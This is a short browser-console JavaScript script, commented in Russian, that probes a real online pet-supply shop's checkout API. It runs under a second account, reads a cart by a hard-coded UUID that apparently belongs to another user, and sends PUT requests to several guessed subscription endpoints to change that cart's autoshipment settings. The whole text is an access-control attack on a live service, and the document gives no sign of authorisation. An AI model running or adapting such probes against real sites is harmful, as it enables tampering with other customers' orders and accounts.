// Проверка изменения subscription settings
// Выполните в консоли браузера под Account B

const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";

(async function() {
  console.log("[*] Testing subscription/autoshipment change...");
  
  const cartBefore = await fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
    credentials: 'include'
  }).then(r => r.json());
  
  console.log(`[+] Before: ${cartBefore.summary.grandTotal} EUR`);
  console.log(`[+] Autoshipment:`, JSON.stringify(cartBefore.cartAutoshipment));
  
  // Попробовать изменить subscription settings
  const endpoints = [
    `/semiprotected/api/checkout/state-api/v2/set-cart-subscription-details`,
    `/semiprotected/api/checkout/state-api/v2/update-subscription`,
    `/semiprotected/api/checkout/state-api/v2/set-autoshipment`,
    `/checkout/api/cart-api/v2/cart/${CART_UUID}/subscription`,
    `/checkout/api/cart-api/v2/cart/${CART_UUID}/autoshipment`,
  ];
  
  for (const endpoint of endpoints) {
    console.log(`\n[*] Testing: ${endpoint}`);
    try {
      const r = await fetch(`https://www.zooplus.de${endpoint}`, {
        method: "PUT",
        credentials: "include",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({interval: "2_WEEKS"})
      });
      console.log(`    Status: ${r.status}`);
      const text = await r.text();
      console.log(`    Response: ${text.substring(0, 200)}`);
    } catch(e) {
      console.log(`    Error: ${e.message}`);
    }
  }
  
  await new Promise(r => setTimeout(r, 2000));
  
  const cartAfter = await fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
    credentials: 'include'
  }).then(r => r.json());
  
  console.log(`\n[+] After: ${cartAfter.summary.grandTotal} EUR`);
  console.log(`[+] Autoshipment:`, JSON.stringify(cartAfter.cartAutoshipment));
})();

